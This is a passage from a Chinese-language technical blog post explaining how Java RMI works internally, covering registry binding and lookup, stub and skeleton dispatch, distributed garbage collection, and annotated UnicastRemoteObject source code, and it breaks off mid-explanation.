<p><code>java.rmi.Naming</code> 类提供了与 RMI 注册中心的交互功能。这个类提供了几个静态方法，用来在 RMI 注册中心中 <strong>查找</strong>、<strong>绑定</strong>、<strong>更新</strong> 或 <strong>解绑</strong> 远程对象：</p>
<ul>
<li><strong>查找远程对象</strong> ： <code>lookup</code></li>
<li><strong>绑定远程对象</strong> ： <code>bind</code>（对象已经存在会抛出异常）和 <code>rebind</code>（会覆盖已有对象）</li>
<li><strong>解除绑定远程对象</strong> ： <code>unbind</code></li>
<li><strong>列出远程对象</strong> ： <code>list</code></li>
</ul>
<p>在服务端代码中，远程对象注册通常是通过 <code>Naming.rebind()</code> 或 <code>Naming.bind()</code> 来实现的。这些方法将远程对象与一个名字绑定，从而让客户端可以使用该名字进行查找。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 创建并启动 RMI 注册中心，监听 1099 端口</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建远程对象实例</span></span><br><span class="line">        <span class="type">RemoteHello</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHello</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 将远程对象注册到 RMI 注册中心，绑定名字 &quot;hello&quot;</span></span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>, hello);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;RemoteHello object is registered.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在上面的示例中，<code>Naming.bind(&quot;rmi://127.0.0.1:1099/hello&quot;, hello)</code> 将 <code>hello</code> 远程对象注册到 RMI 注册中心中，绑定的名字为 <code>&quot;hello&quot;</code>。客户端将通过这个名字来查找并调用远程对象的方法。</p>
<p>除此之外，RMI 还提供了另一种绑定方式。因为通常我们会把注册中心和服务端放在一起，因此 <code>LocateRegistry.createRegistry</code> 创建的注册中心对象 <code>Registry</code>（实际是 <code>sun.rmi.registry.RegistryImpl</code> 实现的 <code>Registry</code> 接口）同样有一个 <code>bind</code> 方法用于注册远程对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"><span class="type">RemoteHello</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHello</span>();</span><br><span class="line">registry.bind(<span class="string">&quot;hello&quot;</span>, hello);</span><br></pre></td></tr></table></figure></div>

<p>由于这个方法直接指定了注册中心，因此 <code>bind</code> 的第一个参数是要与远程对象绑定的名称而不是完整的RMI URL（如 <code>rmi://host:port/name</code>）。</p>
<h4 id="客户端查找远程对象"><a href="#客户端查找远程对象" class="headerlink" title="客户端查找远程对象"></a>客户端查找远程对象</h4><p>客户端通过 RMI 注册中心查找远程对象，方法是使用 <code>Naming.lookup()</code>。这时，客户端将通过给定的名字从 RMI 注册中心中查找远程对象，并通过返回的存根（stub）对象调用远程方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> (Hello) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(hello.sayHello(<span class="string">&quot;sky123&quot;</span>));</span><br><span class="line">        System.out.println(hello.sayGoodBye());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="RMI-工作流程"><a href="#RMI-工作流程" class="headerlink" title="RMI 工作流程"></a>RMI 工作流程</h2><p>RMI 的工作流程大致如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/08/25/Java%20RMI%20&%20JNDI/images/RMI.png"
                      alt="img"
                ></p>
<p>RMI 底层通讯采用了 Stub (运行在客户端) 和 Skeleton (运行在服务端) 机制，RMI 调用远程方法的大致如下：</p>
<pre class="mermaid">sequenceDiagram
    autonumber
    %% ===================== 参与者分组：谁属于谁 =====================
    box "Client JVM" #fff5f5
      participant CApp as 客户端应用
      participant RStub_C as Registry Stub(客户端, 本地创建)
      participant CProxy as 服务对象 Stub/动态代理(Proxy)
      participant CRef as RemoteRef(UnicastRef)
      participant CDGC as DGC 客户端(续约器)
    end
    box "Registry JVM" #f5fff5
      participant RTCP as TCPTransport(JRMP)
      participant RObjT as ObjectTable(Registry)
      participant RTgt as Target(ObjID=0)
      participant RDisp as UnicastServerRef(Registry)
      participant RSkel as RegistryImpl_Skel(legacy)
      participant RImpl as RegistryImpl
      participant RMap as bindings(name→stub)
    end
    box "Server JVM" #f5f5ff
      participant SvcApp as 服务端应用
      participant RStub_S as Registry Stub(服务端, 本地创建)
      participant STCP as TCPTransport(JRMP)
      participant SObjT as ObjectTable(Server)
      participant STgt as Target(ObjID=随机)
      participant SDisp as UnicastServerRef(服务对象, Dispatcher)
      participant SImpl as 远程对象实现(impl)
      participant SStub as 服务对象 Stub/动态代理(可序列化)
      participant SDGC as DGCImpl(ObjID=2)
    end

    %% ===================== ① 服务对象导出（export） =====================
    rect rgb(235,240,255)
      Note over SvcApp,SObjT: ① 导出远程对象（UnicastRemoteObject.exportObject）→ 生成 Stub/Proxy、方法哈希映射(hash→Method)、Target，监听端口
      SvcApp->>SDisp: exportObject(SImpl)
      Note right of SDisp: Util.createProxy(...) → 动态代理<br/>InvocationHandler=RemoteObjectInvocationHandler(ref=UnicastRef)<br/>建立 hashToMethod_Map
      SDisp->>STCP: ref.exportObject(Target) → listen()
      SDisp->>SObjT: ObjectTable.putTarget(Target{impl, disp, stub, id})
      Note right of STgt: Target.stub 是返回给客户端的远程引用(Stub/Proxy)<br/>Skeleton(若存在)仅服务端内部分发使用
    end

    %% ===================== ② Registry 创建并导出 =====================
    rect rgb(235,255,235)
      Note over RImpl,RObjT: ② LocateRegistry.createRegistry(port=1099)<br/>ObjID=0；加载 RegistryImpl_Stub 与 RegistryImpl_Skel(legacy)
      RImpl-->>RDisp: 持有 UnicastServerRef(ref=LiveRef{ObjID=0,port=1099})
      RDisp->>RTCP: exportObject(this)
      RDisp->>RObjT: ObjectTable.putTarget(Target{impl=RImpl, disp=RDisp, stub=RegistryImpl_Stub, id=0})
    end

    %% ===================== ③ 服务端将服务注册到 Registry（bind） =====================
    rect rgb(245,245,255)
      Note over SvcApp,RImpl: ③ 服务注册（bind）：把 name→SStub(服务对象远程引用) 放进 Registry.bindings
      SvcApp->>RStub_S: 获取 Registry Stub（LocateRegistry.getRegistry）
      RStub_S->>RTCP: JRMP newCall {ObjID=0, opnum=0(bind), interfaceHash}<br/>writeObject(name), writeObject(SStub)
      RTCP->>RObjT: 按 ObjID=0 查 Target
      RObjT-->>RTgt: 命中
      RTCP->>RDisp: dispatch
      alt Registry 使用 Skeleton (legacy)
        RDisp->>RSkel: oldDispatch(opnum=0, hash)
        RSkel->>RImpl: bind(name, stub)
      else 现代（无 Skel）
        RDisp->>RImpl: bind(name, stub)
      end
      RImpl->>RMap: bindings.put(name, stub)
      RImpl-->>RStub_S: Return(ok)
    end

    %% ===================== ④ 客户端查找（lookup）并获取服务 Stub =====================
    rect rgb(235,255,245)
      Note over CApp,RImpl: ④ 服务发现/查找：客户端通过 Registry 获取服务的 Stub
      CApp->>RStub_C: 获取 Registry Stub（LocateRegistry.getRegistry(host,1099)）
      RStub_C->>RTCP: JRMP newCall {ObjID=0, opnum=2(lookup)}<br/>writeObject(name)
      RTCP->>RDisp: dispatch
      alt Skeleton 路径
        RDisp->>RSkel: oldDispatch(opnum=2)
        RSkel->>RImpl: lookup(name)
      else 现代路径
        RDisp->>RImpl: lookup(name)
      end
      RImpl->>RMap: bindings.get(name)
      RMap-->>RImpl: 返回 SStub(服务对象远程引用)
      RImpl-->>RStub_C: 返回 stub(序列化)
      RStub_C-->>CApp: 反序列化得到 CProxy(Stub/Proxy)
      Note right of CProxy: 代理的 InvocationHandler=RemoteObjectInvocationHandler<br/>内部持有 CRef(UnicastRef: LiveRef{host,port,objID})
    end

    %% ===================== ⑤ 客户端调用远程方法（普通远程对象主路径） =====================
    rect rgb(255,240,240)
      Note over CApp,SImpl: ⑤ 远程方法调用：opnum=-1 + methodHash(普通对象)，参数与返回值走序列化流
      CApp->>CProxy: foo(arg1, arg2)
      CProxy->>CRef: invoke(method,args,getMethodHash(method))
      CRef->>STCP: JRMP 调用 {ObjID=<服务对象id>, opnum=-1, methodHash, args(serialized)}
      STCP->>SObjT: 按 ObjID 查 Target
      SObjT-->>STgt: 命中
      STCP->>SDisp: 分发
      alt 现代：无 Skeleton（JDK5+ 常见）
        SDisp->>SDisp: 用 methodHash 在 hashToMethod_Map 定位 Method
        SDisp->>SImpl: 反序列化参数 → Method.invoke(...)
        SImpl-->>SDisp: 返回 结果 或 抛出异常
      else Legacy：有 Skeleton（极少见）
        SDisp->>SImpl: Skel.dispatch(opnum) → 调用实现
      end
      SDisp-->>STCP: 写回 {Return | ExceptionalReturn}(序列化)
      STCP-->>CRef: 响应
      alt 正常返回
        CRef-->>CProxy: 反序列化返回值
        CProxy-->>CApp: 返回结果
      else 异常返回
        CRef-->>CProxy: 反序列化异常对象
        CProxy-->>CApp: 抛出同类型异常（或 RemoteException 等包装）
      end
    end

    %% ===================== ⑥ DGC：分布式 GC（租约） =====================
    rect rgb(240,255,255)
      Note over SDGC,SObjT: ⑥ DGC：管理远程引用生命周期（ObjID=2；默认租约≈10 min）
      Note right of SDGC: DGC 在类初始化时以单例形式加入 ObjectTable<br/>导出 {stub=DGCImpl_Stub, skel=DGCImpl_Skel(legacy)}
      CProxy->>CDGC: （运行时跟踪可达性，注册引用）
      CDGC->>SDGC: dirty({ObjID...}, seq, Lease{vmid, duration})
      SDGC-->>CDGC: leaseGranted(授予/调整时长)
      loop 续约直到本地不可达或进程退出
        CDGC->>SDGC: dirty(...)
        SDGC-->>CDGC: leaseGranted
      end
      opt 本地不再持有/对象被本地GC
        CDGC->>SDGC: clean({ObjID...}, seq, vmid, strong)
        SDGC-->>CDGC: ack
      end
    end

    %% ===================== 术语速记 =====================
    Note over CApp,SImpl: 术语：ObjID(对象标识；Registry=0, DGC=2, 普通=随机)<br/> opnum: 0=bind, 2=lookup；普通对象调用用 opnum=-1 + methodHash<br/> 序列化方向：args/return/exception 走 Object{Output|Input}Stream</pre>

<ol>
<li><p><strong>服务端创建远程对象（Object）</strong> ，并准备好提供远程服务。</p>
<ul>
<li><p>如果是普通的对象（继承于 <code>UnicastRemoteObject</code>）：</p>
<ul>
<li>创建动态代理类，处理器为 <code>RemoteObjectInvocationHandler</code>。</li>
<li>因为要通过方法哈希查找对应方法，因此会将方法哈希到方法的映射存放在哈希表 <code>hashToMethod_Map</code> 中。</li>
</ul>
</li>
<li><p>如果是注册中心（<code>RegistryImpl</code>），则创建 <code>RegistryImpl_Stub</code> 和 <code>RegistryImpl_Skel</code>。</p>
</li>
<li><p>如果是 DGC（<code>DGCImpl</code>），则创建 <code>DGCImpl_Stub</code> 和 <code>DGCImpl_Skel</code>。</p>
<blockquote>
<p>DGC 是 Java RMI 的 <strong>Distributed Garbage Collector（分布式垃圾回收器）</strong>。它负责在<strong>服务端</strong>跟踪每个远程对象是否仍被哪些<strong>客户端 JVM</strong>持有，从而在无人引用时允许服务端回收&#x2F;卸载该远程对象。</p>
</blockquote>
</li>
<li><p>远程对象最后会封装成 <code>Target</code> 对象用注册到 <code>ObjectTable</code> 中，其中包括：</p>
<ul>
<li><code>Remote impl</code>：远程对象本体。</li>
<li><code>Dispatcher disp</code>：分发器，是导出对象的 <code>UnicastServerRef</code> 用于处理远程调用请求。对于注册中心和 DGC，<code>UnicastServerRef</code> 会包含 Skel。</li>
<li><code>Remote stub</code>：创建的远程对象存根。<ul>
<li>对于普通远程对象则是远程对象的动态代理。</li>
<li>对于注册中心和 DGC 则是对应的 Skel 对象。</li>
</ul>
</li>
<li><code>ObjID id</code>：对象 Id。<ul>
<li>对于普通远程对象由于没有指定对象 Id，因此在初始化时设为随机值。</li>
<li>对于注册中心则是 0。</li>
<li>对于 DGC 则是 2。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>服务端将远程对象注册到 RMI Registry 中</strong> ，使客户端可以通过名称查找到远程对象。</p>
<ul>
<li>服务端通过调用 <code>RegistryImpl_Stub#bind</code> 方法远程调用注册中心的 <code>bind</code> 方法，将需要注册的类的名称（如果是 RMI URL 则先获到对应的注册中心然后再传递注册的类的名称）和注册的类的动态代理类（Stub）序列化后传递给注册中心。这本质上是对注册中心的 <code>RegistryImpl</code> 的一次 RMI 远程调用。为了避免先有鸡先有蛋的问题，<code>RegistryImpl_Stub</code> 是在调用 <code>LocateRegistry#getRegistry</code> 的时候本地创建的。</li>
<li>注册中心的 <code>TCPTransport#handleMessages</code> 在接收到远程调用后根据对象 Id 在 <code>ObjectTable</code> 找到对应的 <code>Target</code> 对象然后调用其 <code>Target.disp.dispatch</code> 方法进行分发。</li>
<li>对于非普通远程对象会被分发到 <code>oldDispatch</code> 方法，随即会调用 <code>RegistryImpl_Skel#dispatch</code> 根据 <code>opnum</code> 执行对应的处理逻辑，这里应该执行 <code>bind</code> 分支。</li>
<li>在 <code>bind</code> 分支中 <code>RegistryImpl_Skel</code> 会将远程对象名称到远程对象的映射存放到哈希表 <code>bindings</code> 中。</li>
</ul>
</li>
<li><p><strong>客户端通过 RMI Registry 查找注册的远程对象</strong> 。</p>
<ul>
<li>客户端通过 <code>RegistryImpl_Skel#find</code> 方法对注册中心进行 RMI 远程调用，参数为要获取的远程对象名称。</li>
</ul>
</li>
<li><p><strong>RMI Registry 返回远程对象的 Stub 给客户端</strong> ，客户端通过该 Stub 间接与服务端交互。</p>
<ul>
<li>注册中心经历同样的过程，最终调用到 <code>RegistryImpl_Skel#dispatch</code> 的 <code>find</code> 分支。</li>
<li>在 <code>find</code> 分支中 <code>RegistryImpl_Skel</code> 会根据远程对象的名称在哈希表 <code>bindings</code> 中查询到对应的存根类序列化返回。</li>
<li>客户端反序列化结果得到远程对象的存根类。</li>
</ul>
</li>
<li><p><strong>客户端调用 Stub 上的远程方法</strong> ，Stub 会将调用请求封装并发送至服务端。</p>
<ul>
<li>因为这里调用的是普通远程对象的方法，而普通的远程对象的 Stub 是动态代理，因此会被转发到动态代理的 <code>invoke</code> 方法。</li>
</ul>
</li>
<li><p><strong>Stub 和 Skeleton 之间建立通信通道并发送远程调用请求</strong> 。</p>
<ul>
<li>首先建立连接，并且发送调用信息，主要是远程对象 Id，要调用的方法的哈希（因此是普通对象，不采用方法 Id），</li>
<li>如果远程调用有参数则同样需要参数序列化后发送给 Skeleton。</li>
</ul>
</li>
<li><p><strong>Skeleton 接收到 Stub 发来的请求后，代理调用真正的远程对象方法</strong> 。</p>
<ul>
<li>这里同样是 <code>TCPTransport#handleMessages</code> 在接收到远程调用后根据对象 Id 在 <code>ObjectTable</code> 找到对应的 <code>Target</code> 对象然后调用其 <code>Target.disp.dispatch</code> 方法进行分发。</li>
<li>由于是调用普通对象的方法，因此会直接根据方法哈希在哈希表 <code>bindings</code> 中找到要调用的远程对象的方法，而不是不是调用 <code>oldDispatch</code> 方法来执行对应的处理分支。</li>
<li>如果有参数则对参数进行反序列化。</li>
<li>反射调用远程对象的方法。</li>
</ul>
</li>
<li><p><strong>方法执行完毕后，Skeleton 将执行结果返回</strong> 。</p>
</li>
<li><p><strong>Skeleton 将结果通过通信通道发送回 Stub</strong> 。</p>
<ul>
<li>远程对象的方法如果有返回值，则将返回结果序列化后发回 Stub。</li>
<li>如果出现异常将异常结果序列化后发回 Stub。</li>
</ul>
</li>
<li><p><strong>Stub 接收到结果后，返回给客户端用户程序</strong> ，远程调用结束。</p>
<ul>
<li>Stub 将远程返回的结果反序列化后返回给用户程序。</li>
<li>如果返回的远程调用状态为异常则将异常结果反序列化后抛出。</li>
</ul>
</li>
</ol>
<p>以上过程的细节如下图所示，具体代码分析见下文。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/08/25/Java%20RMI%20&%20JNDI/images/1633322482542.png"
                      alt="img"
                ></p>
<h3 id="服务注册"><a href="#服务注册" class="headerlink" title="服务注册"></a>服务注册</h3><h4 id="远程对象创建"><a href="#远程对象创建" class="headerlink" title="远程对象创建"></a>远程对象创建</h4><p>通常我们定义的远程对象会继承于 <code>java.rmi.server.UnicastRemoteObject</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHello</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此创建远程对象的时候会调用父类 <code>UnicastRemoteObject</code> 的构造函数。关于 <code>UnicastRemoteObject</code> 的构造函数的调用有如下调用链：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用匿名端口创建并“导出”一个新的 UnicastRemoteObject 实例。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;效果：构造完成即导出当前对象（this），开始在某个匿名端口上监听 JRMP 调用。</span></span><br><span class="line"><span class="comment"> * 该监听 socket 由 &#123;<span class="doctag">@link</span> java.rmi.server.RMISocketFactory&#125;（或其默认实现）创建。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException 导出失败（如端口占用、套接字创建失败、传输层错误）时抛出</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> JDK 1.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">UnicastRemoteObject</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">// 调用带端口的构造器，其中 0 表示让 OS 分配一个可用的临时端口</span></span><br><span class="line">    <span class="built_in">this</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用指定端口创建并“导出”一个新的 UnicastRemoteObject 实例。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;效果：构造完成即导出当前对象（this），在指定端口上监听 JRMP 调用。</span></span><br><span class="line"><span class="comment"> * 监听 socket 同样通过 &#123;<span class="doctag">@link</span> java.rmi.server.RMISocketFactory&#125; 创建。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> port 远程对象接收调用所用的 TCP 端口；为 0 则表示匿名端口</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException 导出失败时抛出</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> JDK 1.2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">UnicastRemoteObject</span><span class="params">(<span class="type">int</span> port)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="built_in">this</span>.port = port;                 <span class="comment">// 记录服务监听端口（0 代表匿名端口）</span></span><br><span class="line">    <span class="comment">// 关键步骤：将“当前远程对象”导出到指定端口并建立远程引用（RemoteRef）</span></span><br><span class="line">    exportObject((Remote) <span class="built_in">this</span>, port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将任意实现了 &#123;<span class="doctag">@link</span> Remote&#125; 的对象导出到指定端口，返回其“存根（Stub）/代理”。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;说明：</span></span><br><span class="line"><span class="comment"> * - 这是一个“静态导出”入口，不要求 obj 必须继承 UnicastRemoteObject；</span></span><br><span class="line"><span class="comment"> *   对于非继承的场景，可先 new 普通实现类，再调用本方法导出。</span></span><br><span class="line"><span class="comment"> * - 返回值通常是一个可序列化的代理对象（JDK 动态代理或预生成的 stub），</span></span><br><span class="line"><span class="comment"> *   应将其发布给客户端（比如注册到 RMI Registry）。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj  需要导出的远程对象（必须实现 &#123;<span class="doctag">@link</span> Remote&#125;）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> port 监听端口；0 表示匿名端口</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 导出的远程对象代理（客户端持有它发起调用）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException 导出失败时抛出</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> JDK 1.2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, <span class="type">int</span> port)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">// 这里选择基于端口创建一个“单播服务器引用”（UnicastServerRef）作为传输/调度层</span></span><br><span class="line">    <span class="keyword">return</span> exportObject(obj, <span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(port));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用给定的服务器引用（ServerRef）导出指定远程对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;说明：</span></span><br><span class="line"><span class="comment"> * - 若 obj 是 UnicastRemoteObject 的子类实例，则将其内部的 ref 字段设置为该 ServerRef，</span></span><br><span class="line"><span class="comment"> *   便于对象后续通过 ref 完成远程调用的派发。</span></span><br><span class="line"><span class="comment"> * - 真正的导出动作由 UnicastServerRef 执行：打开监听、注册对象ID、生成/返回 stub 等。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj  需要导出的远程对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> sref 服务器端引用（封装了传输层/调度逻辑）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 远程对象的代理（stub）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException 导出失败时抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, UnicastServerRef sref)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">// 若是 UnicastRemoteObject 的实例，则把 ServerRef 记到其 ref 字段，</span></span><br><span class="line">    <span class="comment">// 使该远程对象持有所属的“传输与调度引用”，供内部使用</span></span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> UnicastRemoteObject) &#123;</span><br><span class="line">        ((UnicastRemoteObject) obj).ref = sref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 委托给 ServerRef 完成导出流程（打开端口/绑定对象ID/创建存根/注册到传输层等）</span></span><br><span class="line">    <span class="comment">// 第二个参数（此处为 null）通常用于传入额外的自定义数据或客户端工厂，第三个布尔位表示是否“永久导出”（true 表示不参与分布式 GC，长久存活）</span></span><br><span class="line">    <span class="keyword">return</span> sref.exportObject(obj, <span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>UnicastRemoteObject</code> 构造函数的调用过程为：</p>
<ol>
<li><strong><code>UnicastRemoteObject()</code></strong> ：使用匿名端口（端口为 0，系统会自动选择一个可用端口）创建并导出一个 <code>UnicastRemoteObject</code> 对象。</li>
<li><strong><code>UnicastRemoteObject(int port)</code></strong> ：使用 <code>UnicastRemoteObject</code> 对象本身和指定的端口号创建并导出一个 <code>UnicastRemoteObject</code> 对象。</li>
<li><strong><code>exportObject(Remote obj, int port)</code></strong> ：根据传入的端口号创建一个 <code>UnicastServerRef</code> 对象（存在多层封装，与网络连接有关）用于将远程对象导出到指定的服务器引用。</li>
<li><strong><code>exportObject(Remote obj, UnicastServerRef sref)</code></strong> ：检查传入的 <code>obj</code> 是否是 <code>UnicastRemoteObject</code> 的实例。如果是，设置<code>UnicastRemoteObject</code> 对象的 <code>ref</code> 属性为指定的 <code>UnicastServerRef</code>。<code>UnicastServerRef</code> 是远程对象导出时所需的服务器引用，负责处理网络请求和数据传输。</li>
</ol>
<p><code>UnicastRemoteObject</code> 构造函数最终会调用到 <code>UnicastServerRef</code> 的 <code>exportObject(Remote impl, Object data, boolean permanent)</code> 方法创建服务器存根（<code>Stub</code>），该函数逻辑如下：</p>
